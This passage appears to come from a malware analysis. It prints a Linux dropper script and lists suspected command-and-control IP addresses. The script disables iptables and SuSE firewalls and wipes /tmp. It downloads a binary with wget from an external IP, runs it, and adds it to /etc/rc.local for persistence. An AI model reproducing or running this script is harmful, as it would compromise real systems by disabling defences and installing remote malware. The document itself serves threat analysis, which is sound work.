Initial file dropped

```bash
cd ..;
cd ..;
if [ ! -f "/tmp/Tools-file" ];then
/etc/init.d/iptables stop;
service iptables stop;
SuSEfirewall2 stop;
reSuSEfirewall2 stop;
rm -rf /tmp/*;
cd /tmp;
wget -c http://185.198.56.137:5566/Tools-file;
chmod 777 Tools-file;
killall Tools-file;
./Tools-file;
echo "cd /tmp/">>/etc/rc.local;
echo "./Tools-file&">>/etc/rc.local;
echo "/etc/init.d/iptables stop">>/etc/rc.local;
else
cd ..;
cd /tmp;
ls | grep -v Tools-file| grep -v moni.lod| grep -v gates.lod| grep -v conf.n| xargs rm -rf;
fi
```

Potential command and control IP addresses

```
67.229.24.7
120.78.152.136
185.198.56.137
```

These are the IP address of the DNS servers found initialized as one of the resources for the binary which mostly points to IP address somewhere in China.
